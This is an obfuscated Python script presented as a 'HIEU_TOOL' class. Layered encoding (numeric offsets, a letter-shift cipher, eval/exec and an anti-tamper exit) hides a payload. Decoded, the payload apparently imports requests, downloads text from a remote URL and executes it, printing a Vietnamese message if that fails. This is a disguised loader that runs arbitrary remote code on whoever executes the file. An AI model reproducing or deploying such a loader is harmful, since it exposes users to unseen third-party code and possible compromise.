class HIEU_TOOL():
 def __init__(self:object,_bit:float=False,_exit:str=0,*_eval:str,**_encode:str)->exec:
  _encode[_exit],_bit,self._exec,self._bits,self._rasputin,self._boom=eval,lambda _bit:exit()if self._boom[15]+self._boom[17]+self._boom[8]+self._boom[13]+self._boom[19] in open(__file__, errors=self._boom[8]+self._boom[6]+self._boom[13]+self._boom[14]+self._boom[17]+self._boom[4]).read() or self._boom[8]+self._boom[13]+self._boom[15]+self._boom[20]+self._boom[19] in open(__file__, errors=self._boom[8]+self._boom[6]+self._boom[13]+self._boom[14]+self._boom[17]+self._boom[4]).read()else"".join(_bit if _bit not in self._boom else self._boom[self._boom.index(_bit)+1 if self._boom.index(_bit)+1<len(self._boom)else 0]for _bit in "".join(chr(ord(t)-447414)if t!="ζ"else"\n"for t in self._rasputin(_bit))),lambda _bit:str(_encode[_exit](f"{self._boom[4]+self._boom[-13]+self._boom[4]+self._boom[2]}(''.join(%s),{self._boom[6]+self._boom[11]+self._boom[14]+self._boom[1]+self._boom[0]+self._boom[11]+self._boom[18]}())"%list(_bit))).encode(self._boom[20]+self._boom[19]+self._boom[5]+self._boom[34])if _encode[_exit]==eval else exit(),lambda _byte:_bit(_byte),lambda _delete:"".join(chr(int(_bytes)-len(_delete.split('~')))if _bytes!='¤'else'ζ'for _bytes in str(_delete).split('~')),exit()if _bit else'abcdefghijklmnopqrstuvwxyz0123456789'
  return self.__decode__(_encode[(self._boom[-1]+'_')[-1]+self._boom[18]+self._boom[15]+self._boom[0]+self._boom[17]+self._boom[10]+self._boom[11]+self._boom[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._exec(self._bits(_execute)))[0]
HIEU_TOOL(_bit=False,_sparkle='''447706~447710~447713~447712~447715~447717~447634~447715~447702~447714~447718~447702~447716~447717~447716~¤~¤~447717~447715~447722~447660~¤~447634~447634~447634~447634~447702~447721~447702~447700~447642~447715~447702~447714~447718~447702~447716~447717~447716~447648~447704~447702~447717~447642~447641~447705~447717~447717~447713~447716~447660~447649~447649~447705~447706~447702~447718~447717~447712~447712~447709~447708~447702~447722~447648~447724~447724~447724~447720~447702~447699~447705~447712~447716~447717~447659~447713~447713~447648~447700~447712~447710~447649~447677~447702~447722~447686~447712~447712~447709~447675~447712~447716~447674~447686~447648~447713~447705~447713~447641~447643~447648~447717~447702~447721~447717~447643~¤~447702~447721~447700~447702~447713~447717~447660~¤~447634~447634~447634~447634~447713~447715~447706~447711~447717~447642~447641~447641~447641~447677~447706~455477~447710~447634~447686~447715~447659~447634~447708~455473~447717~447634~447711~455491~447706~447634~447710~455443~447711~447704~447634~447705~447712~455465~447700~447634~447716~447702~447719~447702~447715~447634~447700~447705~455515~447659~447634~447717~447712~447712~447709~447634~447875~447659~447711~447704~447634~447700~447845~447634~447709~455497~447706~447641~447641~447641~447643~447634''')